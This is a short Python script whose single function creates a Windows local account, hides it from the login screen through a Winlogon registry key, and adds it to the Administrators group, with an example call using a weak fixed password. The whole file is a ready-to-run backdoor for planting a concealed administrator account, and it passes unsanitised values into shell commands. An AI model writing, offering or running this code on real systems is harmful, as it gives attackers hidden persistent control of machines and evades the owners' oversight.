import subprocess

def create_hidden_admin_user(username, password):
    command_user = f"net user {username} {password} /add /y"
    command_hidden = f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v {username} /t REG_DWORD /d 0 /f"
    command_admin = f"net localgroup administrators {username} /add"
    
    result_user = subprocess.run(command_user, shell=True, capture_output=True, text=True)
    if result_user.returncode == 0:
        print(f"User '{username}' created successfully.")
    else:
        print(f"Failed to create user: {result_user.stderr}")
    
    result_hidden = subprocess.run(command_hidden, shell=True, capture_output=True, text=True)
    if result_hidden.returncode == 0:
        print(f"User '{username}' hidden from login screen.")
    else:
        print(f"Failed to hide user: {result_hidden.stderr}")
    
    result_admin = subprocess.run(command_admin, shell=True, capture_output=True, text=True)
    if result_admin.returncode == 0:
        print(f"User '{username}' added to the Administrators group successfully.")
    else:
        print(f"Failed to add user to Administrators group: {result_admin.stderr}")

# Example usage
create_hidden_admin_user("hiddenadmin", "password123")